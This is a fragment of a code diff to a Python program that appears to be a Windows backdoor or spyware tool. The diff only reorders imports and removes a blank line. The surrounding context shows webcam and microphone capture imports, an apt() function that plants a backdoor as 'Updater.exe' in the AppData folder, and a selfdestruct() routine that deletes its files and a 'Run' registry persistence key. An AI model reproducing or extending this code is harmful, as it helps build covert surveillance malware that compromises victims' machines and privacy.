@@ -1,4 +1,9 @@
 import os
+import pyautogui
+import shutil
+import sys
+import ctypes
+import random
 import subprocess as sp
 import requests
 from cv2 import VideoCapture, imwrite
@@ -7,11 +12,6 @@ from sounddevice import rec, wait
 import platform
 import re
 from urllib.request import Request, urlopen
-import pyautogui
-import shutil
-import sys
-import ctypes
-import random
 
 def apt():
     backdoor_location = os.environ["appdata"] + "\\Updater.exe"
@@ -178,7 +178,6 @@ def selfdestruct():
             shutil.rmtree(config_location)
         sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
         return True
-
     except Exception as e:
         return e
 
